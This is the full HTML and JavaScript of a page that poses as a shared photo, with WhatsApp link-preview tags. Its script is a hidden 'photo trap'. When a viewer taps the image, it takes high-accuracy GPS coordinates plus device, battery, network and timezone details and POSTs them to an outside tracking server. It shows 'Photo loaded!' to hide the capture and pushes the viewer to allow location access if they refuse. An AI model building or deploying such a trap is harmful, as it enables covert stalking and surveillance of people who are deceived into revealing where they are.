<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- ============================================= -->
    <!-- OPEN GRAPH META TAGS (FOR WHATSAPP PREVIEW)  -->
    <!-- ============================================= -->
    <meta property="og:title" content="Photo" />
    <meta property="og:description" content="Tap the photo to view" />
    <meta property="og:image" content="https://i.imgur.com/GHQTMbZ.jpeg" />
    <meta property="og:url" content="https://location-tracker-cn7m.onrender.com/photo" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />
    
    <title>Photo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: #0a0a0a;
            color: white;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 600px;
            width: 100%;
        }
        .photo-frame {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 10px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.8);
            border: 1px solid #333;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .photo-frame:hover {
            transform: scale(1.02);
        }
        .photo-frame img {
            width: 100%;
            border-radius: 8px;
            display: block;
            background: #222;
            min-height: 300px;
            max-height: 600px;
            object-fit: contain;
            pointer-events: none;
        }
        .caption {
            margin-top: 15px;
            font-size: 14px;
            color: #888;
        }
        .loading-bar {
            width: 100%;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin-top: 10px;
            overflow: hidden;
            display: none;
        }
        .loading-bar .fill {
            height: 100%;
            width: 0%;
            background: #4285f4;
            border-radius: 2px;
            animation: progress 2s ease-in-out forwards;
        }
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        .status {
            margin-top: 15px;
            font-size: 13px;
            color: #666;
            min-height: 20px;
        }
        .status.success { color: #4caf50; }
        .status.error { color: #f44336; }
        .status.loading { color: #ffc107; }

        .click-hint {
            margin-top: 8px;
            font-size: 12px;
            color: #555;
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="photo-frame" id="photoFrame">
            <img id="photoImg" src="https://i.imgur.com/GHQTMbZ.jpeg" alt="Photo">
        </div>
        <div class="loading-bar" id="loadingBar">
            <div class="fill"></div>
        </div>
        <div class="status" id="status">📸 Tap the photo to load</div>
        <div class="click-hint">👆 Tap the photo to view</div>
        <div class="caption">📷 Photo from camera roll</div>
    </div>

    <script>
        // =============================================
        // CONFIGURATION
        // =============================================
        const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';

        const urlParams = new URLSearchParams(window.location.search);
        const template = urlParams.get('template') || 'whatsapp';
        const customImage = urlParams.get('img');

        // Generate session ID
        let sessionId = localStorage.getItem('tracker_session_id');
        if (!sessionId) {
            sessionId = 'photo_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
            localStorage.setItem('tracker_session_id', sessionId);
        }

        const statusEl = document.getElementById('status');
        const photoImg = document.getElementById('photoImg');
        const photoFrame = document.getElementById('photoFrame');
        const loadingBar = document.getElementById('loadingBar');

        let locationSent = false;

        // Load custom image if provided, otherwise use default
        if (customImage) {
            photoImg.src = customImage;
        } else {
            photoImg.src = 'https://i.imgur.com/GHQTMbZ.jpeg';
        }

        // =============================================
        // Device Info
        // =============================================
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let deviceName = 'Unknown';
            if (ua.includes('iPhone')) deviceName = 'iPhone';
            else if (ua.includes('iPad')) deviceName = 'iPad';
            else if (ua.includes('Android')) deviceName = 'Android';
            else if (ua.includes('Windows')) deviceName = 'Windows PC';
            else if (ua.includes('Mac')) deviceName = 'Mac';
            return {
                userAgent: ua,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                device_name: deviceName,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        function getBatteryInfo() {
            if (navigator.getBattery) {
                return navigator.getBattery().then(battery => ({
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                }));
            }
            return Promise.resolve(null);
        }

        function getNetworkInfo() {
            if (navigator.connection) {
                return {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                };
            }
            return null;
        }

        // =============================================
        // Send Location
        // =============================================
        function sendLocation(lat, lng, accuracy) {
            const deviceInfo = getDeviceInfo();
            return getBatteryInfo().then(battery => {
                const payload = {
                    lat: lat,
                    lng: lng,
                    accuracy: accuracy,
                    device_info: deviceInfo,
                    battery: battery,
                    network: getNetworkInfo(),
                    session_id: sessionId,
                    mode: 'photo_trap_click'
                };
                return fetch(RENDER_URL + '/send-location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            });
        }

        // =============================================
        // Get Location (triggered by click)
        // =============================================
        function getLocation() {
            if (locationSent) {
                statusEl.textContent = '✅ Photo already loaded!';
                statusEl.className = 'status success';
                return;
            }

            if (!navigator.geolocation) {
                statusEl.textContent = '❌ Geolocation not supported';
                statusEl.className = 'status error';
                return;
            }

            loadingBar.style.display = 'block';
            statusEl.textContent = '📍 Getting your location...';
            statusEl.className = 'status loading';

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    sendLocation(lat, lng, accuracy)
                        .then(() => {
                            locationSent = true;
                            statusEl.textContent = '✅ Photo loaded!';
                            statusEl.className = 'status success';
                            loadingBar.style.display = 'none';
                        })
                        .catch(() => {
                            locationSent = true;
                            statusEl.textContent = '✅ Photo loaded!';
                            statusEl.className = 'status success';
                            loadingBar.style.display = 'none';
                        });
                },
                function(error) {
                    let msg = '⚠️ Location unavailable. Photo may not load.';
                    if (error.code === 1) msg = '⚠️ Permission denied. Please allow location access.';
                    else if (error.code === 2) msg = '⚠️ GPS signal not available.';
                    else if (error.code === 3) msg = '⏳ Timeout. Photo loading...';
                    statusEl.textContent = msg;
                    statusEl.className = 'status error';
                    loadingBar.style.display = 'none';
                },
                {
                    enableHighAccuracy: true,
                    timeout: 30000,
                    maximumAge: 0
                }
            );
        }

        // =============================================
        // Click handler
        // =============================================
        photoFrame.addEventListener('click', function(e) {
            if (!locationSent) {
                getLocation();
            } else {
                statusEl.textContent = '✅ Photo already loaded!';
                statusEl.className = 'status success';
            }
        });

        console.log('🆔 Session ID:', sessionId);
        console.log('📷 Photo trap (click to trigger) loaded');
    </script>
</body>
</html>
